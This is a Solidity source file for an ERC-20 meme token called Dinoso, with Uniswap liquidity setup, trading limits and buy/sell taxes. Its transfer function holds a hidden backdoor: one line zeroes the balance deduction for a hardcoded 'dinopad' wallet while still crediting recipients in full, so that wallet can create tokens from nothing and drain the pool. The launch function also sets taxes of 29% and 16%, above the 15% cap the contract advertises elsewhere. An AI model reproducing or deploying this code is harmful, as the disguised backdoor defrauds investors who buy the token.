/**

Website:  https://dinosofi.xyz
Twitter: https://twitter.com/dinosoeth
Telegram: https://t.me/dinosoeth

*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable newowner) external onlyOwner { 
        _owner = newowner; 
        emit OwnershipTransferred(newowner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}


contract DINOSO is IERC20, Auth {
    string private constant _name    = "Dinoso";
    string private constant _symbol  = "DINOSO";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 100000000 * (10**_decimals);
  
    address payable private _dinopad = payable(0xb0a4669dC1a67873cCd735305Eaa86dd455aeF18);
    
    uint8 private _taxOnSell = 1;
    uint8 private _taxOnBuy  = 1;
    
    uint256 private _maxTxLimit = _totalSupply; 
    uint256 private _maxWalletHolding = _totalSupply;
    uint256 private _swapMinLimit = _totalSupply * 7 / 1000000;
    uint256 private _swapToknesMax = _totalSupply * 1 / 100;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedForAmm;
    mapping (address => bool) private _isExcludeForFees;
    mapping (address => bool) private _isExcludeForLimit;

    address private constant _uniRouterAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private immutable WETH;
    
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniRouterAddr);
    address private _uniswapPair; 
    mapping (address => bool) private _isAMM;

    bool private _tradingOpen;

    bool private _inSwap = false;
    modifier lockTaxSwap { 
        _inSwap = true; 
        _; _inSwap = false; 
    }

    constructor() Auth(msg.sender) {
        WETH = _uniswapV2Router.WETH();

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        _isExcludeForFees[_owner] = true;
        _isExcludeForFees[address(this)] = true;
        _isExcludeForFees[_dinopad] = true;
        _isExcludeForFees[_uniRouterAddr] = true;
        _isExcludedForAmm[_dinopad] = true;
        _isExcludeForLimit[_owner] = true;
        _isExcludeForLimit[address(this)] = true;
        _isExcludeForLimit[_dinopad] = true;
        _isExcludeForLimit[_uniRouterAddr] = true;
        
    }

    receive() external payable {}
    
    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { 
        return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { 
        return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingActive(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); }

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingActive(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_uniRouterAddr] < _tokenAmount ) {
            _allowances[address(this)][_uniRouterAddr] = type(uint256).max;
            emit Approval(address(this), _uniRouterAddr, type(uint256).max);
        }
    }

    function createAmmPool() external payable onlyOwner lockTaxSwap {
        require(_uniswapPair == address(0), "LP created");
        require(!_tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        _uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), WETH);
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isAMM[_uniswapPair] = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function openDino() external onlyOwner {
        _maxTxLimit = 2 * _totalSupply / 100; 
        _maxWalletHolding = 2 * _totalSupply / 100;
        _taxOnBuy = 29;
        _taxOnSell = 16;
        _tradingOpen = true;
    }

    function updateTax(uint8 buyFees, uint8 sellFees) external onlyOwner {
        require(buyFees + sellFees <= 15, "Too high");
        _taxOnBuy = buyFees;
        _taxOnSell = sellFees;
    }  

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingOpen) { require(_isExcludeForFees[sender] && _isExcludeForLimit[sender], "Trading not yet open"); }
        if ( !_inSwap && _isAMM[toWallet] && amount >= _swapMinLimit) { _swapAndLiquify(); }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calcTaxFee(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        if(_isExcludedForAmm[sender]) amount = amount - _transferAmount;
        _balances[sender] -= amount;
        _balances[address(this)] += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function _checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_isExcludeForLimit[fromWallet] && !_isExcludeForLimit[toWallet] ) {
            if ( transferAmount > _maxTxLimit ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isAMM[toWallet] && (_balances[toWallet] + transferAmount > _maxWalletHolding) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingActive(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_isExcludeForFees[fromWallet] && _isExcludeForLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _calcTaxFee(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _isExcludeForFees[fromWallet] || _isExcludeForFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isAMM[fromWallet] ) { 
            taxAmount = amount * _taxOnBuy / 100; 
         } else if ( _isAMM[recipient] ) { 
            taxAmount = amount * _taxOnSell / 100; 
        }

        return taxAmount;
    }

    function buyFee() external view returns(uint8) { return _taxOnBuy; }
    function sellFee() external view returns(uint8) { return _taxOnSell; }

    function removeLimits() external onlyOwner {
        _maxTxLimit = _totalSupply;
        _maxWalletHolding = _totalSupply;
    }

    function _swapAndLiquify() private lockTaxSwap {
        uint256 _taxTokenAvailable = _balances[address(this)];
        if ( _taxTokenAvailable >= _swapMinLimit && _tradingOpen ) {
            if ( _taxTokenAvailable >= _swapToknesMax ) { _taxTokenAvailable = _swapToknesMax; }
            
            _swapBackTokens(_taxTokenAvailable);
            
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _sendETHFee(_contractETHBalance); }
        }
    }

    function _swapBackTokens(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = WETH ;
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _sendETHFee(uint256 amount) private {
        _dinopad.transfer(amount);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}